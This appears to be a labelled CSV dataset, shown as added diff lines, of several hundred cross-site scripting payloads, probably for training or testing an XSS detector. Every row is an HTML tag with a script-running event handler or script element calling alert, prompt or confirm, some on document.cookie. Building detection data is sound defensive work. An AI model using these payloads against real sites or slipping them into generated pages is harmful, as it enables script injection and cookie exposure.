+"<img onkeydown=""alert(1)"">",1
+<textarea oninput='alert(window.location)'>,1
+<form onerror='prompt(1)'>,1
+"<iframe onmouseout=""alert(1)"">",1
+<div onkeydown='alert(1)'>,1
+<div onerror='alert(window.location)'>,1
+<img src='x' onerror='alert(4)'>,1
+<iframe/ondrag=confirm(1)>,1
+"<img onsubmit=""alert(window.location)"">",1
+<marquee/onblur=alert(document.cookie)>,1
+<details/oninput=alert(window.location)>,1
+<details onselect=alert(1)>,1
+<textarea onmouseout='alert(1)'>,1
+<span oninput=alert(document.domain)>,1
+<svg/onload=alert(1)>,1
+<span oninput='confirm(1)'>,1
+<input onkeydown=alert(document.domain)>,1
+<object onerror=alert(window.location)>,1
+<form onkeyup='confirm(1)'>,1
+"<textarea onsubmit=""alert(1)"">",1
+"<video onselect=""alert(window.location)"">",1
+<img onmouseover=confirm(1)>,1
+<video onblur=alert(document.domain)>,1
+<audio onkeydown=alert(window.location)>,1
+"<button ondblclick=""confirm(1)"">",1
+<object onerror='alert(document.cookie)'>,1
+<audio oninput=alert(window.location)>,1
+"<body oninput=""alert(document.domain)"">",1
+<details/onwheel=prompt(1)>,1
+<textarea/onerror=alert(1)>,1
+<object ondblclick=confirm(1)>,1
+<button ondblclick=confirm(1)>,1
+<object onclick=prompt(1)>,1
+"<marquee onload=""alert(window.location)"">",1
+"<audio onclick=""confirm(1)"">",1
+<details onmouseout='alert(1)'>,1
+"<span onfocus=""prompt(1)"">",1
+<img src=x onerror='alert(3)'>,1
+<audio oninput=alert(1)>,1
+<video onkeydown=alert(document.cookie)>,1
+<body onfocus='alert(1)'>,1
+<audio onkeydown='alert(document.domain)'>,1
+"<button onload=""confirm(1)"">",1
+"<select ondrag=""alert(window.location)"">",1
+<div/onchange=alert(window.location)>,1
+<body/ondrop=alert(document.cookie)>,1
+"<embed onclick=""alert(document.domain)"">",1
+<input onmouseout=alert(window.location)>,1
+<img onfocus='alert(1)'>,1
+"<div ondrag=""alert(document.cookie)"">",1
+<audio onerror='alert(1)'>,1
+<img oninput='prompt(1)'>,1
+"<select ondblclick=""alert(document.cookie)"">",1
+<select/onmouseout=alert(1)>,1
+"<span onmouseover=""alert(1)"">",1
+<img ondrag='prompt(1)'>,1
+"<audio ondrag=""alert(window.location)"">",1
+"<button onblur=""alert(1)"">",1
+"<details onchange=""alert(1)"">",1
+<video/onerror=alert(window.location)>,1
+<video onblur='alert(1)'>,1
+<form onmouseover='alert(1)'>,1
+<svg onload=alert(7)>,1
+<details onerror='alert(1)'>,1
+<marquee onselect=alert(1)>,1
+<video onerror='alert(window.location)'>,1
+<ImG sRc=x OnErRoR=alert(2)>,1
+<video onchange='alert(document.cookie)'>,1
+<iframe onchange=alert(1)>,1
+<audio onblur='alert(document.cookie)'>,1
+<video onblur=alert(1)>,1
+<textarea/onkeypress=alert(1)>,1
+<img src onerror=alert(2)>,1
+<textarea ondrag='alert(window.location)'>,1
+<iframe/onkeydown=prompt(1)>,1
+<marquee/onsubmit=alert(document.cookie)>,1
+"<object oncontextmenu=""alert(document.cookie)"">",1
+"<input onclick=""prompt(1)"">",1
+<select onkeydown=alert(window.location)>,1
+<textarea onkeypress='alert(window.location)'>,1
+<textarea onselect='alert(document.domain)'>,1
+<div onerror=alert(1)>,1
+<audio/oncontextmenu=prompt(1)>,1
+"<img ondrop=""confirm(1)"">",1
+<div onclick='alert(document.cookie)'>,1
+<audio/ondblclick=alert(document.domain)>,1
+<embed/onmouseover=alert(document.cookie)>,1
+<div onfocus=alert(document.domain)>,1
+<iframe onmouseover=alert(1)>,1
+<video onkeypress='confirm(1)'>,1
+"<textarea onkeypress=""alert(1)"">",1
+"<form onkeydown=""confirm(1)"">",1
+<span onmouseover='alert(1)'>,1
+"<body onblur=""alert(1)"">",1
+<form onsubmit='alert(1)'>,1
+<input onselect='alert(1)'>,1
+"<div onmouseout=""alert(1)"">",1
+<embed/onfocus=alert(window.location)>,1
+"<object ondrop=""alert(1)"">",1
+<svg><set onbegin=alert(10) attributeName=x>,1
+<form onload=alert(window.location)>,1
+<embed onkeypress=alert(1)>,1
+"<div onload=""alert(document.domain)"">",1
+<embed/ondrop=alert(window.location)>,1
+<input oncontextmenu='prompt(1)'>,1
+<select oninput=prompt(1)>,1
+<div onmouseover='prompt(1)'>,1
+<body onblur='alert(1)'>,1
+<IMG SRC=x ONERROR=alert(9)>,1
+"<textarea onmouseout=""alert(1)"">",1
+<select oncontextmenu='confirm(1)'>,1
+<audio/onwheel=prompt(1)>,1
+<img/ondblclick=confirm(1)>,1
+<body/onchange=alert(1)>,1
+<textarea onblur=alert(1)>,1
+<form onkeyup=confirm(1)>,1
+<body oninput=confirm(1)>,1
+"<input onsubmit=""alert(1)"">",1
+<marquee/onblur=alert(window.location)>,1
+<audio ondrag=alert(document.cookie)>,1
+<select onwheel=alert(1)>,1
+"<iframe onfocus=""prompt(1)"">",1
+<form ondblclick='alert(window.location)'>,1
+<img ondrop=alert(window.location)>,1
+<div ondrop='alert(document.domain)'>,1
+"<input onkeydown=""alert(document.domain)"">",1
+"<iframe ondrag=""prompt(1)"">",1
+<iframe ondrop='alert(window.location)'>,1
+<textarea onload='alert(document.cookie)'>,1
+<form onload='confirm(1)'>,1
+"<img ondrag=""prompt(1)"">",1
+<span onclick='alert(document.cookie)'>,1
+"<object onkeypress=""alert(1)"">",1
+<embed onfocus=alert(window.location)>,1
+<iframe onsubmit='confirm(1)'>,1
+"<form ondrag=""prompt(1)"">",1
+<marquee/onkeyup=alert(window.location)>,1
+<details/onerror=alert(1)>,1
+<a href='javascript:prompt(1)'>click</a>,1
+<embed ondrop=alert(window.location)>,1
+<video onwheel=alert(window.location)>,1
+<form/onerror=prompt(1)>,1
+<img src='x' onerror='alert(10)'>,1
+<img onmouseover='alert(1)'>,1
+<object onselect='confirm(1)'>,1
+<form onmouseover=alert(1)>,1
+<form onkeydown='confirm(1)'>,1
+<body onselect='prompt(1)'>,1
+<input onmouseout='alert(window.location)'>,1
+<body onblur=alert(1)>,1
+<div onkeydown=alert(document.domain)>,1
+"<video ondrag=""alert(window.location)"">",1
+<object/onload=alert(window.location)>,1
+"<marquee ondrag=""alert(document.cookie)"">",1
+<select onfocus=alert(1) autofocus>,1
+<details onselect='alert(1)'>,1
+"<object ondblclick=""alert(document.cookie)"">",1
+<embed/onblur=alert(document.domain)>,1
+<svg><animateTransform onbegin=alert(3)>,1
+<video/onsubmit=alert(document.domain)>,1
+"<object onkeyup=""alert(1)"">",1
+<div onclick='alert(1)'>,1
+<img src=x onerror=alert(6)>,1
+<audio ondblclick=alert(document.domain)>,1
+<audio/onselect=alert(document.cookie)>,1
+<iframe ondrop=confirm(1)>,1
+<img onselect='prompt(1)'>,1
+<details onblur=alert(document.domain)>,1
+"<textarea onchange=""confirm(1)"">",1
+<div onkeydown='alert(document.domain)'>,1
+<ImG sRc=x OnErRoR=alert(10)>,1
+"<object onclick=""prompt(1)"">",1
+<details/onblur=alert(document.domain)>,1
+"<form onsubmit=""alert(1)"">",1
+<form onkeydown=alert(1)>,1
+"<iframe onsubmit=""confirm(1)"">",1
+<textarea onload=alert(document.cookie)>,1
+<audio oncontextmenu=alert(window.location)>,1
+<button oninput='alert(1)'>,1
+"<embed oncontextmenu=""prompt(1)"">",1
+<textarea/oninput=alert(window.location)>,1
+<div onerror=alert(document.domain)>,1
+<body oninput=prompt(1)>,1
+"<textarea onclick=""alert(1)"">",1
+<button onsubmit=alert(1)>,1
+<ImG sRc=x OnErRoR=alert(1)>,1
+<textarea onmouseout=alert(1)>,1
+<body ondrop='alert(document.domain)'>,1
+<IMG SRC=x ONERROR=alert(7)>,1
+<embed/onfocus=alert(document.domain)>,1
+<embed ondblclick='alert(document.domain)'>,1
+"<details onwheel=""prompt(1)"">",1
+<textarea/ondrag=alert(document.domain)>,1
+"<audio onselect=""prompt(1)"">",1
+<input oncontextmenu=alert(1)>,1
+"<embed ondrop=""alert(window.location)"">",1
+"<select onclick=""alert(1)"">",1
+<iframe ondrop=alert(window.location)>,1
+<select onkeypress='alert(document.cookie)'>,1
+<button ondrop='alert(document.domain)'>,1
+"<div onmouseover=""alert(1)"">",1
+<img onsubmit=alert(window.location)>,1
+<details onchange='alert(document.cookie)'>,1
+<button onselect=alert(document.cookie)>,1
+<object/ondblclick=alert(window.location)>,1
+<textarea onfocus=alert(1)>,1
+<marquee/onwheel=alert(window.location)>,1
+<audio onclick=alert(1)>,1
+<iframe/ondrag=prompt(1)>,1
+"<object onmouseover=""alert(document.cookie)"">",1
+<body oninput='prompt(1)'>,1
+<input onmouseover='alert(1)'>,1
+<body onmouseover=alert(1)>,1
+<button onfocus=alert(1)>,1
+"<img onselect=""prompt(1)"">",1
+<body onchange=alert(window.location)>,1
+<form onerror='alert(1)'>,1
+<audio/ondblclick=alert(document.cookie)>,1
+<textarea onblur=prompt(1)>,1
+<span oninput=alert(1)>,1
+"<img onmouseover=""confirm(1)"">",1
+<audio oninput='alert(window.location)'>,1
+"<details onmouseover=""alert(document.cookie)"">",1
+<marquee ondrag='confirm(1)'>,1
+<form onsubmit=confirm(1)>,1
+<audio onselect=alert(document.cookie)>,1
+<img onmouseover='confirm(1)'>,1
+"<video onkeydown=""alert(document.cookie)"">",1
+<input onerror='confirm(1)'>,1
+<img onkeydown=alert(1)>,1
+<img onwheel='alert(document.cookie)'>,1
+<marquee/onmouseover=alert(1)>,1
+<svg/onload=alert(9)>,1
+<audio/ondblclick=prompt(1)>,1
+<span/oninput=alert(1)>,1
+<iframe onmouseout='alert(window.location)'>,1
+<details onload='alert(window.location)'>,1
+"<marquee onkeypress=""alert(document.cookie)"">",1
+<body/onkeyup=alert(document.domain)>,1
+<iframe onblur=alert(window.location)>,1
+<form onsubmit='confirm(1)'>,1
+<video/onchange=alert(document.domain)>,1
+<details/oncontextmenu=alert(document.cookie)>,1
+"<span onerror=""alert(document.cookie)"">",1
+<video onchange='prompt(1)'>,1
+<embed onload=alert(document.cookie)>,1
+<img onmouseover=alert(document.domain)>,1
+<textarea ondrag=prompt(1)>,1
+<video/onwheel=alert(window.location)>,1
+"<form ondblclick=""alert(window.location)"">",1
+<img/src=x/onerror=alert(3)>,1
+<details onchange=alert(document.cookie)>,1
+<textarea onkeyup=alert(window.location)>,1
+<button/ondrag=prompt(1)>,1
+<input/onwheel=alert(document.domain)>,1
+<img src=x onerror='alert(9)'>,1
+"<marquee onchange=""confirm(1)"">",1
+"<embed onload=""alert(document.cookie)"">",1
+<div onkeypress='prompt(1)'>,1
+<textarea/onerror=confirm(1)>,1
+<embed/ondrag=alert(document.domain)>,1
+<video/onmouseover=confirm(1)>,1
+<details/onfocus=prompt(1)>,1
+"<div onkeydown=""alert(document.domain)"">",1
+<img src onerror=alert(10)>,1
+<div/onkeyup=prompt(1)>,1
+<textarea oncontextmenu='alert(document.cookie)'>,1
+<audio onwheel=alert(1)>,1
+<audio oninput=alert(document.domain)>,1
+<body onload='alert(1)'>,1
+<details onchange=alert(1)>,1
+<div/onkeypress=prompt(1)>,1
+<div onerror=alert(window.location)>,1
+<details ondblclick=prompt(1)>,1
+<div onkeyup=prompt(1)>,1
+<select onload='alert(1)'>,1
+<embed/onkeyup=alert(document.domain)>,1
+"<form onclick=""alert(window.location)"">",1
+<button ondrop=alert(document.cookie)>,1
+<img src=x onerror=prompt(2)>,1
+"<button onselect=""alert(document.cookie)"">",1
+<img/onkeydown=alert(document.domain)>,1
+"<embed onfocus=""confirm(1)"">",1
+<input onsubmit=confirm(1)>,1
+<body onwheel='alert(window.location)'>,1
+"<img onkeypress=""confirm(1)"">",1
+<div onerror='alert(1)'>,1
+<embed onfocus='confirm(1)'>,1
+<video onload='alert(1)'>,1
+<form onmouseout='alert(1)'>,1
+"<video onchange=""alert(document.domain)"">",1
+<marquee/onblur=confirm(1)>,1
+<body onkeydown=alert(document.domain)>,1
+<iframe/oncontextmenu=alert(document.domain)>,1
+"<body onchange=""alert(window.location)"">",1
+<embed/oninput=prompt(1)>,1
+"<img src=x onerror=""alert(3)"">",1
+<video/ondrag=alert(window.location)>,1
+<input/ondrop=alert(document.domain)>,1
+<iframe onkeydown=prompt(1)>,1
+"<form ondblclick=""prompt(1)"">",1
+"<input onsubmit=""alert(document.domain)"">",1
+"<img onselect=""alert(document.domain)"">",1
+<textarea/onfocus=prompt(1)>,1
+<object oncontextmenu='confirm(1)'>,1
+"<input onkeyup=""alert(1)"">",1
+"<marquee onsubmit=""prompt(1)"">",1
+"<img src=x onerror=""alert(4)"">",1
+<select onwheel='alert(1)'>,1
+"<button oninput=""alert(document.cookie)"">",1
+<img/onwheel=alert(document.cookie)>,1
+<textarea ondrop=alert(document.cookie)>,1
+<body oncontextmenu=prompt(1)>,1
+"<object onchange=""prompt(1)"">",1
+<span ondblclick=prompt(1)>,1
+<marquee onfocus=alert(document.cookie)>,1
+<iframe onkeydown='alert(1)'>,1
+"<video onchange=""alert(document.cookie)"">",1
+<marquee onkeyup='alert(window.location)'>,1
+<details onsubmit=alert(document.domain)>,1
+"<textarea oncontextmenu=""alert(document.cookie)"">",1
+<img onselect=alert(document.cookie)>,1
+<ImG sRc=x OnErRoR=alert(4)>,1
+<iframe oncontextmenu=alert(document.domain)>,1
+<object onmouseout='confirm(1)'>,1
+<details onkeyup=alert(window.location)>,1
+<div/onselect=confirm(1)>,1
+<div/ondrop=alert(document.domain)>,1
+"<iframe onwheel=""alert(1)"">",1
+<input onmouseout=prompt(1)>,1
+<input/onmouseout=prompt(1)>,1
+<form ondrag=prompt(1)>,1
+<audio/oninput=alert(document.domain)>,1
+<textarea ondrop=confirm(1)>,1
+<body ondrop=alert(document.cookie)>,1
+<form onchange='alert(1)'>,1
+<textarea/onsubmit=alert(1)>,1
+<iframe oninput=alert(document.cookie)>,1
+<audio onblur=alert(document.cookie)>,1
+<div/onload=confirm(1)>,1
+<span onload='alert(1)'>,1
+<img src=x onerror=confirm(10)>,1
+<img onmouseover=alert(1)>,1
+<select onclick=alert(1)>,1
+<img onselect=alert(1)>,1
+<embed onload='alert(document.cookie)'>,1
+<video/onfocus=alert(document.cookie)>,1
+"<object onerror=""alert(window.location)"">",1
+<form/onkeydown=confirm(1)>,1
+<object/onerror=alert(window.location)>,1
+"<details onsubmit=""alert(document.domain)"">",1
+<ImG sRc=x OnErRoR=alert(8)>,1
+"<form onsubmit=""alert(document.cookie)"">",1
+<div onfocus='alert(document.domain)'>,1
+<form/ondrop=confirm(1)>,1
+<div/oninput=alert(document.domain)>,1
+<input onkeydown=alert(1)>,1
+"<object onerror=""alert(document.domain)"">",1
+<ImG sRc=x OnErRoR=alert(6)>,1
+<audio onkeypress=alert(document.domain)>,1
+<input/onclick=confirm(1)>,1
+<details/onchange=alert(1)>,1
+<select/onwheel=confirm(1)>,1
+<input onload=alert(1)>,1
+<audio ondrag='alert(document.domain)'>,1
+<span oninput=confirm(1)>,1
+<svg onload=alert(10)>,1
+<span onerror=alert(window.location)>,1
+<form onsubmit=prompt(1)>,1
+<object onmouseover='alert(document.cookie)'>,1
+<span ondrag=alert(1)>,1
+<svg><set onbegin=alert(8) attributeName=x>,1
+<img oninput=prompt(1)>,1
+<audio onerror='confirm(1)'>,1
+<details oninput='alert(window.location)'>,1
+<div/onselect=alert(document.cookie)>,1
+"<img src=x onerror=""alert(7)"">",1
+"<input onclick=""alert(1)"">",1
+<button onclick=alert(1)>,1
+<img/onselect=alert(1)>,1
+<select onfocus='alert(1)'>,1
+"<iframe onload=""prompt(1)"">",1
+<span onmouseover=alert(1)>,1
+"<textarea onload=""alert(document.cookie)"">",1
+"<img onkeydown=""alert(document.domain)"">",1
+<svg><animate onbegin=alert(3) attributeName=x>,1
+<body/onkeyup=alert(1)>,1
+"<select onkeypress=""confirm(1)"">",1
+"<marquee onerror=""alert(document.domain)"">",1
+<img src onerror=alert(4)>,1
+<input oninput='alert(window.location)'>,1
+<form/onkeyup=confirm(1)>,1
+<input/onkeypress=alert(document.cookie)>,1
+<textarea onchange=confirm(1)>,1
+<details ondblclick='prompt(1)'>,1
+<object onchange='prompt(1)'>,1
+<div/onfocus=alert(document.domain)>,1
+<img/ondrag=alert(document.cookie)>,1
+<input onclick='alert(1)'>,1
+"<span onchange=""alert(1)"">",1
+<img/onmouseover=confirm(1)>,1
+<audio/ondrag=alert(document.domain)>,1
+<iframe onfocus='prompt(1)'>,1
+<object onmouseout=confirm(1)>,1
+<body ondblclick='alert(window.location)'>,1
+<span onfocus=alert(1)>,1
+"<div oncontextmenu=""alert(document.cookie)"">",1
+<button onkeypress=confirm(1)>,1
+"<textarea onselect=""alert(document.domain)"">",1
+<embed onchange='alert(document.cookie)'>,1
+<video onmouseover=confirm(1)>,1
+<embed/oncontextmenu=alert(window.location)>,1
+<marquee/onload=confirm(1)>,1
+"<details ondblclick=""prompt(1)"">",1
+<audio ondrag='alert(document.cookie)'>,1
+<textarea onmouseover=confirm(1)>,1
+"<audio oncontextmenu=""prompt(1)"">",1
+<video/onselect=confirm(1)>,1
+<embed oncontextmenu='prompt(1)'>,1
+<object onload='alert(window.location)'>,1
+<body/onsubmit=alert(document.cookie)>,1
+<span onfocus='alert(1)'>,1
+"<marquee onfocus=""alert(document.cookie)"">",1
+<div onchange='alert(1)'>,1
+<details onkeypress='alert(document.cookie)'>,1
+"<form oncontextmenu=""alert(window.location)"">",1
+<div/onkeydown=alert(document.domain)>,1
+"<img onkeypress=""prompt(1)"">",1
+<marquee/oncontextmenu=prompt(1)>,1
+<img onload=alert(1)>,1
+<marquee/onchange=alert(document.domain)>,1
+"<textarea onload=""alert(document.domain)"">",1
+"<form onkeydown=""alert(1)"">",1
+<img src='x' onerror='alert(1)'>,1
+<select/ondblclick=alert(document.cookie)>,1
+<img src=x onerror=prompt(8)>,1
+"<marquee onkeypress=""alert(window.location)"">",1
+<body onerror='alert(1)'>,1
+"<iframe onmouseover=""alert(document.cookie)"">",1
+<embed/onchange=alert(document.cookie)>,1
+"<details onsubmit=""alert(1)"">",1
+<video onmouseover='confirm(1)'>,1
+<iframe onload=prompt(1)>,1
+<div onwheel='alert(window.location)'>,1
+"<button oninput=""alert(1)"">",1
+"<form onblur=""alert(1)"">",1
+"<textarea onkeyup=""alert(window.location)"">",1
+<object onwheel=alert(document.cookie)>,1
+"<body onerror=""prompt(1)"">",1
+"<img oninput=""prompt(1)"">",1
+"<iframe ondrag=""confirm(1)"">",1
+<object/onmouseover=alert(document.cookie)>,1
+<embed/ondblclick=alert(document.domain)>,1
+<img ondrag=alert(document.cookie)>,1
+"<marquee onmouseover=""alert(1)"">",1
+<iframe onmouseover=alert(document.cookie)>,1
+<img src=x onerror=confirm(3)>,1
+<iframe onmouseover=alert(document.domain)>,1
+<textarea/onkeypress=alert(window.location)>,1
+<div onchange=alert(document.cookie)>,1
+<div/oncontextmenu=alert(document.cookie)>,1
+"<iframe onkeydown=""prompt(1)"">",1
+<audio onwheel='alert(document.cookie)'>,1
+<button onload='alert(document.domain)'>,1
+"<form onmouseover=""alert(1)"">",1
+<div oninput='alert(document.domain)'>,1
+"<span oninput=""alert(window.location)"">",1
+<select onclick='prompt(1)'>,1
+<div oncontextmenu='alert(document.cookie)'>,1
+"<object onkeydown=""alert(document.cookie)"">",1
+<marquee onkeydown=prompt(1)>,1
+<svg onload=alert(2)>,1
+"<body onerror=""alert(document.domain)"">",1
+<input oncontextmenu='alert(1)'>,1
+<iframe onmouseout=alert(window.location)>,1
+<textarea/onload=alert(document.cookie)>,1
+<audio onwheel=alert(document.cookie)>,1
+"<img onkeydown=""alert(document.cookie)"">",1
+"<video ondrop=""alert(document.cookie)"">",1
+<audio/oninput=alert(1)>,1
+<input/onerror=alert(1)>,1
+<body ondblclick=alert(window.location)>,1
+<marquee onfocus='alert(1)'>,1
+<div onsubmit='alert(1)'>,1
+<marquee onkeyup=alert(window.location)>,1
+"<audio onwheel=""alert(document.cookie)"">",1
+"<textarea oninput=""confirm(1)"">",1
+<iframe/onmouseover=alert(document.domain)>,1
+<object/ondblclick=alert(document.cookie)>,1
+<select onkeydown='alert(window.location)'>,1
+<textarea onblur='prompt(1)'>,1
+<span ondrag=confirm(1)>,1
+<button onload='confirm(1)'>,1
+"<img src=x onerror=""alert(10)"">",1
+<iframe onclick='confirm(1)'>,1
+<span/onclick=alert(document.domain)>,1
+<object/oncontextmenu=confirm(1)>,1
+<span oninput=alert(window.location)>,1
+<body onload='prompt(1)'>,1
+<button/ondrop=alert(window.location)>,1
+"<body onselect=""prompt(1)"">",1
+<audio onwheel='alert(window.location)'>,1
+<input onclick='confirm(1)'>,1
+"<video onfocus=""alert(document.cookie)"">",1
+<button/oninput=alert(document.cookie)>,1
+<input onsubmit='confirm(1)'>,1
+"<object onwheel=""confirm(1)"">",1
+<details/onkeypress=alert(document.cookie)>,1
+<img ondrop=confirm(1)>,1
+<textarea onwheel=alert(window.location)>,1
+<svg><set onbegin=alert(6) attributeName=x>,1
+"<form onmouseout=""alert(document.domain)"">",1
+<iframe onload='prompt(1)'>,1
+<input onwheel='alert(document.domain)'>,1
+<body/oncontextmenu=prompt(1)>,1
+<object onkeypress='alert(1)'>,1
+<video onkeypress=confirm(1)>,1
+<embed onmouseout=prompt(1)>,1
+<svg><animateTransform onbegin=alert(2)>,1
+"<span onkeypress=""alert(window.location)"">",1
+<audio ondblclick='alert(document.cookie)'>,1
+"<form onload=""alert(1)"">",1
+<img/onselect=prompt(1)>,1
+<iframe/onclick=alert(1)>,1
+<form/ondblclick=prompt(1)>,1
+<form ondblclick='prompt(1)'>,1
+"<audio oncontextmenu=""alert(window.location)"">",1
+<body onkeyup='alert(document.domain)'>,1
+<span onkeydown='alert(document.cookie)'>,1
+<form onsubmit='prompt(1)'>,1
+"<embed onselect=""confirm(1)"">",1
+<iframe/onwheel=alert(1)>,1
+"<input onkeydown=""confirm(1)"">",1
+"<iframe onblur=""alert(window.location)"">",1
+<button oninput='alert(document.cookie)'>,1
+<svg><animate onbegin=alert(2) attributeName=x>,1
+<object/onkeyup=alert(1)>,1
+"<iframe onsubmit=""alert(document.domain)"">",1
+<button onload=alert(1)>,1
+"<span onwheel=""alert(window.location)"">",1
+<video onchange=alert(document.domain)>,1
+<img src=x onerror=confirm(2)>,1
+<video onblur='alert(document.domain)'>,1
+<details onkeyup=confirm(1)>,1
+<img ondrop='confirm(1)'>,1
+<input onerror='alert(document.domain)'>,1
+<details ondrag='confirm(1)'>,1
+<input onmouseover=alert(1)>,1
+<div onselect='alert(document.cookie)'>,1
+"<button onsubmit=""alert(1)"">",1
+"<marquee onwheel=""confirm(1)"">",1
+<form onload='alert(document.domain)'>,1
+<body/onerror=alert(document.domain)>,1
+<audio/onerror=confirm(1)>,1
+"<img onload=""alert(1)"">",1
+<img src onerror=alert(5)>,1
+<iframe onload='alert(1)'>,1
+<input/oncontextmenu=alert(1)>,1
+<details onsubmit='alert(1)'>,1
+"<body ondrop=""alert(document.domain)"">",1
+<svg/onload=alert(6)>,1
+<form oncontextmenu='alert(document.cookie)'>,1
+<img/src=x/onerror=alert(6)>,1
+"<div onfocus=""alert(document.domain)"">",1
+<select/oncontextmenu=confirm(1)>,1
+"<div onblur=""alert(1)"">",1
+<iframe/onsubmit=confirm(1)>,1
+<IMG SRC=x ONERROR=alert(5)>,1
+<marquee onkeypress=alert(document.domain)>,1
+<marquee/onload=alert(window.location)>,1
+<select onmouseout=confirm(1)>,1
+"<object onselect=""alert(1)"">",1
+"<select onmouseover=""alert(document.cookie)"">",1
+<form/onkeypress=alert(document.domain)>,1
+<details/onsubmit=alert(document.domain)>,1
+"<details onkeydown=""alert(window.location)"">",1
+<iframe oncontextmenu='alert(document.domain)'>,1
+"<select onchange=""alert(1)"">",1
+"<div onload=""confirm(1)"">",1
+"<marquee onkeydown=""confirm(1)"">",1
+"<button onerror=""alert(1)"">",1
+<iframe onfocus='alert(1)'>,1
+<marquee onload=confirm(1)>,1
+"<span onerror=""confirm(1)"">",1
+<iframe onchange=alert(document.domain)>,1
+<audio onload='alert(window.location)'>,1
+"<span onload=""alert(1)"">",1
+"<div onclick=""alert(document.cookie)"">",1
+<iframe ondblclick='alert(1)'>,1
+<body/onkeyup=alert(window.location)>,1
+<form oninput='prompt(1)'>,1
+<marquee/onkeydown=confirm(1)>,1
+<audio/ondrop=alert(document.cookie)>,1
+"<body oninput=""confirm(1)"">",1
+<audio onerror=confirm(1)>,1
+<img onmouseover='alert(document.domain)'>,1
+<details onmouseout=alert(1)>,1
+<embed/onkeypress=alert(1)>,1
+<input onsubmit=alert(1)>,1
+"<audio oninput=""alert(1)"">",1
+<img src=x onerror=confirm(8)>,1
+<input ondrop=alert(document.domain)>,1
+<body onkeyup=alert(1)>,1
+"<select onload=""alert(1)"">",1
+<div onerror='prompt(1)'>,1
+"<body onkeydown=""alert(1)"">",1
+<input oncontextmenu=prompt(1)>,1
+<iframe onblur='alert(1)'>,1
+<input onkeyup='alert(1)'>,1
+<textarea/onchange=confirm(1)>,1
+<img onload='alert(1)'>,1
+<button oninput=alert(1)>,1
+<textarea ondrag=alert(document.cookie)>,1
+<iframe/onmouseout=alert(window.location)>,1
+<img src=x onerror=alert(10)>,1
+<form/ondrag=prompt(1)>,1
+<textarea onfocus=prompt(1)>,1
+"<button ondrop=""alert(window.location)"">",1
+<svg><script>alert(8)</script></svg>,1
+"<audio onkeydown=""alert(window.location)"">",1
+<img onblur=alert(1)>,1
+<form oninput=prompt(1)>,1
+<form onmouseout='alert(document.domain)'>,1
+<textarea onkeypress=alert(1)>,1
+"<div onload=""alert(1)"">",1
+"<img ondblclick=""alert(window.location)"">",1
+<details/ondblclick=prompt(1)>,1
+"<form onsubmit=""prompt(1)"">",1
+<form/oncontextmenu=alert(1)>,1
+<video/onkeydown=confirm(1)>,1
+"<img src=x onerror=""alert(1)"">",1
+<svg onload=alert(8)>,1
+<span onerror=confirm(1)>,1
+"<details onfocus=""prompt(1)"">",1
+"<button onkeyup=""alert(document.cookie)"">",1
+<iframe onwheel=alert(1)>,1
+<audio onwheel='alert(1)'>,1
+"<iframe onkeyup=""alert(window.location)"">",1
+<audio oncontextmenu=prompt(1)>,1
+<textarea onkeypress=alert(window.location)>,1
+<input onclick='prompt(1)'>,1
+<button/onload=alert(document.domain)>,1
+<object oncontextmenu=alert(document.cookie)>,1
+<img onfocus=alert(1)>,1
+<img onwheel=alert(document.cookie)>,1
+<img/ondrop=confirm(1)>,1
+<select/onkeydown=alert(1)>,1
+"<marquee onblur=""alert(document.cookie)"">",1
+<body/oninput=alert(document.domain)>,1
+<object onerror='alert(window.location)'>,1
+"<form oncontextmenu=""alert(1)"">",1
+<img src onerror=alert(6)>,1
+<img onselect=alert(document.domain)>,1
+<object/onsubmit=confirm(1)>,1
+<iframe/onblur=alert(window.location)>,1
+<img/ondblclick=alert(window.location)>,1
+"<object onselect=""confirm(1)"">",1
+<textarea onclick='alert(1)'>,1
+<object/onkeypress=alert(1)>,1
+"<span onmouseout=""alert(1)"">",1
+<select oncontextmenu=confirm(1)>,1
+"<select onwheel=""alert(1)"">",1
+<button/onkeyup=alert(document.cookie)>,1
+<textarea/onsubmit=alert(document.domain)>,1
+<object onselect=confirm(1)>,1
+<body/onchange=alert(window.location)>,1
+<video ondblclick='alert(window.location)'>,1
+<span onclick='alert(1)'>,1
+"<select onfocus=""prompt(1)"">",1
+<img/onselect=alert(document.cookie)>,1
+<div onclick=alert(document.cookie)>,1
+<input onsubmit=alert(document.domain)>,1
+"<img onselect=""alert(1)"">",1
+"<input onerror=""alert(document.domain)"">",1
+"<video onkeydown=""confirm(1)"">",1
+<input onfocus=confirm(1)>,1
+<div/oncontextmenu=confirm(1)>,1
+"<audio onload=""alert(window.location)"">",1
+<marquee onblur=alert(document.cookie)>,1
+"<embed onmouseover=""alert(document.cookie)"">",1
+"<select onmouseout=""confirm(1)"">",1
+<iframe/onfocus=prompt(1)>,1
+<video/onblur=confirm(1)>,1
+<button/onkeydown=alert(document.cookie)>,1
+<textarea/oninput=confirm(1)>,1
+<button/ondblclick=alert(window.location)>,1
+<div onload='alert(1)'>,1
+<span onmouseout='alert(1)'>,1
+<svg/onload=alert(10)>,1
+"<video onload=""alert(1)"">",1
+<img/src=x/onerror=alert(1)>,1
+<video onclick='confirm(1)'>,1
+<svg><animate onbegin=alert(10) attributeName=x>,1
+<audio onwheel='prompt(1)'>,1
+<form/onload=alert(window.location)>,1
+<button/ondrop=alert(document.domain)>,1
+<embed onfocus=alert(document.domain)>,1
+<embed onkeydown='alert(window.location)'>,1
+<select/onkeypress=confirm(1)>,1
+"<details onchange=""alert(document.cookie)"">",1
+<video onkeydown='alert(document.cookie)'>,1
+<embed/onsubmit=alert(document.cookie)>,1
+"<audio ondrag=""confirm(1)"">",1
+<audio oncontextmenu='alert(document.domain)'>,1
+<img src=x onerror=alert(3)>,1
+<button ondrop=alert(document.domain)>,1
+<button/oninput=alert(1)>,1
+<video/onkeypress=confirm(1)>,1
+<audio/onclick=alert(1)>,1
+<textarea/onload=alert(document.domain)>,1
+"<span onclick=""alert(1)"">",1
+<input/onblur=alert(1)>,1
+<body/onerror=prompt(1)>,1
+<details/onselect=alert(1)>,1
+<div/onfocus=prompt(1)>,1
+<span onmouseover='alert(document.cookie)'>,1
+<body onload=alert(1)>,1
+<object ondblclick=alert(window.location)>,1
+"<video ondblclick=""alert(window.location)"">",1
+<audio/onload=alert(window.location)>,1
+<form/ondblclick=alert(window.location)>,1
+<div/onmouseout=alert(1)>,1
+<div onclick=alert(1)>,1
+<select/onwheel=alert(1)>,1
+<form oncontextmenu=alert(window.location)>,1
+<marquee onkeydown='prompt(1)'>,1
+<embed onsubmit=alert(document.cookie)>,1
+<input/onerror=alert(document.cookie)>,1
+<img src=x onerror='alert(2)'>,1
